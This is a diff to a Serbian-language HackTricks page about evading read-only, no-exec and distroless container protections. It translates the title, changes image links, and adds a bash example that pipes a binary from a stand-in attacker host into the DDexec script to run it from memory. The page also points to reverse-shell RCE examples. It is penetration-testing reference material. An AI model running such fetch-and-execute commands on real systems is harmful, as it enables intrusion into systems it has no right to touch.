@@ -1,4 +1,4 @@
-# Bypass FS zaštite: samo za čitanje / bez izvršavanja / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
 <details>
 
@@ -14,7 +14,7 @@ Drugi načini podrške HackTricks-u:
 
 </details>
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Ako vas zanima **hakerska karijera** i hakovanje neuhvatljivog - **zapošljavamo!** (_potrebno je tečno poznavanje pisanog i govornog poljskog jezika_).
 
@@ -81,10 +81,12 @@ Stoga, **kontrolišući asemblerski kod** koji se izvršava od strane procesa, m
 {% hint style="success" %}
 **DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** svoj sopstveni **shellcode** ili **bilo koji binarni fajl** iz **memorije**.
 {% endhint %}
+
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
+
 Za više informacija o ovoj tehnici pogledajte Github ili:
 
 {% content-ref url="ddexec.md" %}
@@ -131,7 +133,7 @@ Međutim, u ovakvim kontejnerima ove zaštite obično postoje, ali možete koris
 
 Možete pronaći **primere** kako **iskoristiti neke RCE ranjivosti** da biste dobili **reverse shell-ove skripting jezika** i izvršili binarne fajlove iz memorije na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://github.com/carlospolop/hacktricks/blob/rs/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>
 
 Ako ste zainteresovani za **hakersku karijeru** i hakovanje neuhvatljivog - **zapošljavamo!** (_potrebno je tečno poznavanje poljskog jezika u pisanju i govoru_).
 
